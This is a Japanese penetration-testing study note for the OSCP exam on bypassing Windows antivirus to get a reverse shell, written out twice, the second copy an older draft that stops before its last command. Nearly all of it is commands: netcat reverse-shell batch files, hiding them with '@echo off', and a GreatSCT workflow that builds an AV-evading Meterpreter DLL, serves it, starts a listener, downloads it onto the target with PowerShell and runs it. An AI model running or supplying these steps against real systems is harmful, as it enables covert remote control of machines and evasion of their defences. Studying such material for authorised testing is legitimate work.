
- 関連ノート：
	- [Web攻撃の難読化](Web攻撃の難読化.md)
- 参考🔗：[HackTricks - AV Bypass](https://book.hacktricks.wiki/en/windows-hardening/av-bypass.html)

>[!Note]
>AVの回避はOSCP試験において主眼ではなかったため、簡素な内容にとどめる。
>しかし、現実のテストやこの後のOSEPでは非常に重要なテクニックなので、今後充実化していく。

## Anti Virus — Windows

目的：Windowsマシンからリバースシェルを獲得する

> [!TIP] EXEよりもDLLのほうがAV回避の成功確率が高い

---

### バッチファイル（bat）

リバースシェル用バッチファイルの作成

```cmd
echo <path_to_nc.exe> -e cmd <attacker_IP> <port> > shell.bat
```

バッチファイルで、コマンドの内容を表示せず実行させる

```cmd
@echo off
c:\temp\nc.exe <attacker_IP> <port> -e cmd.exe
```

> [!NOTE] `@echo off` を先頭に付けることで、実行時にコマンド内容がコンソールに表示されなくなる

---

### DLL w/ GreatSCT

meterpreterシェルを獲得するAV bypassペイロードを作成する。

> [!WARNING] MeterpreterはOSCPでは1回しか使用できない

#### 攻撃者のマシン（Kali）

1. インストール

```zsh
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/
cd setup
sudo ./setup.sh -c
cd ../
```

2. ペイロードの作成

```zsh
sudo ./GreatSCT.py --ip <attacker_IP> --port <port> -t bypass -p regsvcs/meterpreter/rev_tcp.py -o <output_filename>
```

> [!TIP] 出力に以下の情報が含まれるのでよく確認すること：
> 
> - `DLL written to:` → 生成されたDLLの格納パス
> - `Metasploit RC file written to:` → msfconsoleで使うRCファイルのパス
> - `Execute with:` → ターゲット上での実行コマンド

3. ペイロードの転送用サーバを立てる

```zsh
cd <path_to_dll_dir>  # DLL written to: の値のフォルダまで指定
sudo python3 -m http.server 80
```

4. meterpreterリスナーを起動（セッションはまだ未作成）

```zsh
msfconsole -r <path_to_rc_file>  # Metasploit RC file written to: の値
```

#### ターゲットマシン（Windows）

5. ペイロードのダウンロード

```cmd
powershell -command Invoke-WebRequest -Uri 'http://<attacker_IP>:<port>/<payload_filename>' -OutFile 'C:\Temp\<payload_filename>'
```

6. バッチファイル化

```cmd
cmd /c "echo <execute_with_value> > C:\Temp\<filename>.bat"
```

7. バッチファイルの実行

```cmd
C:\Temp\<filename>.bat
```




ーーー


# Anti Virus

## Windows

目的：Windowsマシンからリバースシェルを獲得したい。
- EXEよりもDLLが成功確率高い

###### バッチファイル(bat)

```cmd
echo [path to nc.exe] -e cmd [AttackerIP] [Port] > shell.bat
```

バッチファイルで、コマンドの内容を表示せず実行させる
```cmd
@echo off
c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe
```

### DLL w/ [GreatSCT](https://github.com/GreatSCT/GreatSCT)

meterpreterシェルを獲得するAV bypassのペイロードを作成する。
（※：MeterpreterはOSCPで1回しか使えない）

#### 攻撃者のマシン

- インストール
```zsh
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/
cd setup
sudo ./setup.sh -c
cd ../
sudo ./GreatSCT.py --ip 10.10.14.13 --port 1234 -t bypass -p
regsvcs/meterpreter/rev_tcp.py -o [output file]
```

- ペイロードの作成
```zsh
cd GreatSCT
sudo ./GreatSCT.py --ip [Attacker IP] --port [Port] -t bypass -p
regsvcs/meterpreter/rev_tcp.py -o [Output]
```
出力に、どこに作成されたペイロードが格納されているか、実行する方法（Execute with）などがあるのでよく見ること。

- ペイロードの転送用サーバを立てておく
```zsh
cd [DLL written to:の値で、フォルダまで指定]
sudo python3 -m http.server 80
```

- meterpreterリスナーを開く（sessionは未作成）
```zsh
msfconsole -r [Metasploit RC file written to:の値]
```

#### ペイロード実行先（windowsマシン）

- ペイロードのダウンロード
```cmd
powershell -command Invoke-WebRequest -Uri 'http://[IP]:[Port]/[payload]' -OutFile 'C:\tmep\[payload]'
```

- バッチファイル化
```cmd
cmd /c "echo [Execute with:の値] > C:\Temp\[file].bat"
```

- バッチの実行
